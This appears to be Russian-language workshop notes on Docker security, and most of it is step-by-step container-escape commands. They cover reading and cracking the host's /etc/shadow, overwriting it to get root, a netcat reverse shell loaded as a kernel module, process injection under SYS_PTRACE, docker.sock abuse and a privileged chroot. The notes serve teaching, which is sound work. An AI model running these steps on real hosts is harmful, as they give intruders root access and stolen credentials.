Приветствие
Алексей
Работаю
Занимаюсь безопасностью контейнерных перевозок
Веду канал Ever Secure, подписывайтесь, много чего интересного
Один из ведущих подкаста SafeCode Live
Член программного комитета DevOops Conf и SafeCode conf

Создаем ВМ

install docker
https://docs.docker.com/engine/install/ubuntu/

sudo docker version
sudo usermod -aG docker ${USER}

docker version

#ssh harden
/etc/ssh/sshd_config
AllowUsers *@192.0.2.100
sudo sshd -t

# узнаем про изоляцию docker 
ls -l /proc/$$/ns
docker run -d --rm --name mynginx nginx
docker exec -it mynginx bash
ls -l /proc/$$/ns
apt update
apt install -y procps
docker inspect -f '{{ .State.Pid }}' mynginx
#сравниваем выдачу ps aux
ps -aux | grep PID

#Сначала узнаем про capability и Apparmor
apt install libcap2-bin
^D
docker commit mynginx mynginx
docker images
docker stop mynginx

docker run -d --rm --name mynginx -p 80:80  mynginx
docker exec -it mynginx bash
capsh --print

docker run -d --rm --name privnginx -p 8080:80 --privileged=true mynginx
docker exec -it privnginx bash
capsh --print

docker run -d --rm --name dropnginx -p 9000:80 --cap-drop=ALL mynginx
docker exec -it dropnginx bash
capsh --print

#Узнаем про Apparmor
docker ps --quiet --all | xargs docker inspect --format '{{ .Name }}: AppArmorProfile={{ .AppArmorProfile }}'
docker stop mynginx privnginx dropnginx

#Делаем образ с capsh
docker run -it --rm --name myubuntu ubuntu
apt update
apt install -y libcap2-bin vim gcc net-tools netcat john ssh
capsh --print
docker commit myubuntu myubuntu

# CAP SYS_ADMIN
docker run -it --cap-drop=ALL --cap-add=SYS_ADMIN --security-opt apparmor=unconfined --device=/dev/:/ myubuntu bash
caps --print
^D

sudo useradd unpriv
sudo useradd admin
sudo passwd unpriv
sudo passwd admin

sudo usermod -aG docker unpriv
su unpriv
sudo -v
groups
docker run -it --rm -v /:/host myubuntu bash
grep admin /host/etc/shadow

sudo usermod -G "" meltdown
^D
groups
sudo install -m=xs $(which docker) .
./docker run -it --rm -v /:/host myubuntu
grep admin /host/etc/shadow
^D
grep admin /etc/shadow
sudo usermod -aG docker ${USER}
^D
ssh



#CAP SYS_PTRACE  + shared pid NS
/usr/bin/python3 -m http.server 8080

docker run -it --rm --pid=host --cap-add=SYS_PTRACE --security-opt apparmor=unconfined myubuntu bash
ps -eaf | grep "/usr/bin/python3 -m http.server 8080" | head -n 1
vim inject.c
gcc -o inject inject.c
./inject <PID>
nc 192.168.1.12 5600

whoami
sudo -i
docker ps

# SYS_MODULE
# На локальной машине!!!!!
lsb_release -a
docker run -it --cap-add=SYS_MODULE ubuntu:20.04 bash
apt update
version=$(uname -r)
apt install -y make vim netcat gcc linux-headers-$version kmod net-tools
vim Makefile
vim reverse-shell.c
#change IP!!! 172.17.0.1
make
nc -lnvp 4444 & /usr/sbin/insmod reverse-shell.ko
rmmod reverse-shell.ko

# CAP DAC_READ_SEARCH
# на локальной машине
sudo passwd root

docker run -it --cap-add=DAC_READ_SEARCH myubuntu bash
apt install -y vim ssh gcc john net-tools netcat

vim shocker.c
gcc -o shocker shocker.c
./shocker /etc/passwd passwd
./shocker /etc/shadow shadow
unshadow passwd shadow > password
john password --format=crypt

# /etc/ssh/sshd_config
PermitRootLogin
PermitRootLogin yes

# CAP SYS_ADMIN DAC_OVERRIDE
docker run -it --cap-add=DAC_READ_SEARCH --cap-add=DAC_OVERRIDE myubuntu bash
# Copy and paste the shocker.c content
vim shocker.c
gcc -o read shocker.c
# Copy and paste the shocker_write.c content
vim shocker_write.c
gcc -o write shocker_write.c
# Use the ./read to read files from host: ./read /host/path /container/path
./read /etc/shadow shadow
./read /etc/passwd passwd
# Create new user and reset its password
useradd <USER-NAME>
echo '<USER-NAME>:<PASSWORD>' | chpasswd 
# Update the new user details in the copied files from host
tail -1 /etc/passwd >> passwd
tail -1 /etc/shadow >> shadow
# Copy the new user password hash paste it also for the root user in the shadow file. This will allow us to elevate permissions on the host.
vim shadow
# Use the ./write to write files from host: ./write /host/path /container/path
./write /etc/passwd passwd
./write /etc/shadow shadow
# Connect to host over ssh using the new user (unprivileged)
ssh privet@192.168.1.12
# Elevate privileges to root user with the new password
su

#CAP NO_CAP!!!
docker run -it -v /var/run/docker.sock:/run/docker.sock docker:dind /bin/sh

docker run -it --privileged -v /:/host/ ubuntu bash -c "chroot /host/"



docker run -it --cap-drop=ALL --cap-add=SYS_ADMIN --cap-add=DAC_OVERRIDE --security-opt apparmor=unconfined ubuntu:16.04 bash

